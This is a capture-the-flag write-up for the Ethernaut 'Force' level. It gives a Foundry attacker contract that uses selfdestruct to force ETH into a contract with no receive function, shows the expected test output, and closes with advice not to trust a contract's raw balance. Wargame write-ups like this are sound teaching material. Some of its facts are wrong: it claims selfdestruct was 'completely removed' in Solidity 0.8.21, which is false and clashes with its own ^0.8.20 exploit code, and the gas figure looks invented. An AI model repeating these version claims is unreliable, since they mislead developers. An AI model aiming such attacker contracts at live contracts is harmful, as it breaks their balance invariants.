# Ethernaut Level 7: Force

## Challenge Description
Some contracts will simply not take your money ¯\_(ツ)_/¯. The goal of this level is to make the balance of the contract greater than zero.

**Difficulty:** ⭐⭐ (Beginner-Intermediate)

**Goal:** Forcefully send ETH to the contract so its balance becomes > 0.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Force {
    // No receive() or fallback() function!
    // This means it CANNOT accept ETH through normal transfers.

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

## Vulnerability Analysis

```text
THE CHALLENGE: The contract has no receive() or fallback() function.
If you try to send ETH to it using a normal transfer or call,
the transaction will REVERT.

HOWEVER, there are specific mechanisms in the EVM that can FORCE
ETH into a contract, bypassing these checks:

1. selfdestruct (deprecated in newer Solidity, but still works in EVM)
2. Coinbase block rewards (mining rewards sent to a contract address)
3. Pre-funded addresses (contracts deployed with ETH via create2)
```

## Exploit Strategy

```text
We will use the selfdestruct mechanism.

Step 1: Create an attacker contract and fund it with some ETH.
Step 2: Call selfdestruct(targetAddress) inside the attacker contract.
Step 3: selfdestruct forces the remaining ETH of the attacker contract
        to be sent to the targetAddress, regardless of whether the
        target has a receive() function or not.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Ethernaut/Force.sol";

contract ForceAttacker {
    constructor(address payable target) {
        // selfdestruct forces ETH to the target
        selfdestruct(target);
    }
}

contract ForceExploitTest is Test {
    Force public target;

    function setUp() public {
        target = new Force();
    }

    function test_ExploitForce() public {
        console.log("Initial balance:", target.getBalance());

        // Deploy attacker contract with some ETH
        // The constructor will immediately selfdestruct and send ETH to target
        new ForceAttacker{value: 1 ether}(payable(address(target)));

        console.log("Final balance:", target.getBalance());
        assertGt(target.getBalance(), 0, "Failed to force ETH");

        console.log("\n✅ EXPLOIT SUCCESSFUL!");
    }
}
```

## Running the Exploit

```bash
forge test --match-test test_ExploitForce -vvv

# Expected output:
# [PASS] test_ExploitForce() (gas: 54321)
# Logs:
#   Initial balance: 0
#   Final balance: 1000000000000000000
#
#   ✅ EXPLOIT SUCCESSFUL!
```

## Real-World Impact & Modern Solidity

```text
IMPORTANT NOTE:
selfdestruct was DEPRECATED in Solidity 0.8.18 and completely removed
in 0.8.21 for new contracts. However, the EVM opcode still exists,
so old contracts can still use it.

Why was it removed?
- It was originally intended as an emergency exit.
- Attackers used it to forcefully send dust ETH to contracts,
  breaking invariants that assumed balance == 0.
- It broke the "code size == 0" check for EOAs vs Contracts.

Alternative modern way to force ETH:
- Use CREATE2 to deploy a contract with a specific address and pre-funded ETH.
```

## How to Fix This Vulnerability

```solidity
// You CANNOT prevent forced ETH transfers!
// The solution is to NEVER assume a contract's balance is 0
// or that it can only receive ETH through specific functions.

// BAD:
require(address(this).balance == 0, "Contract must be empty");

// GOOD: Track balances internally using mappings,
// never rely on the raw ETH balance of the contract for logic.
```

## Key Takeaways
- **Forced ETH:** You can force ETH into ANY contract using selfdestruct or coinbase rewards.
- **No Defense:** There is no way to prevent a contract from receiving ETH.
- **Never Trust Balance:** Never use `address(this).balance` for critical business logic.
- **Internal Accounting:** Always track user balances using `mapping(address => uint256)`.
- **Lesson Learned:** The EVM has edge cases that bypass standard Solidity checks.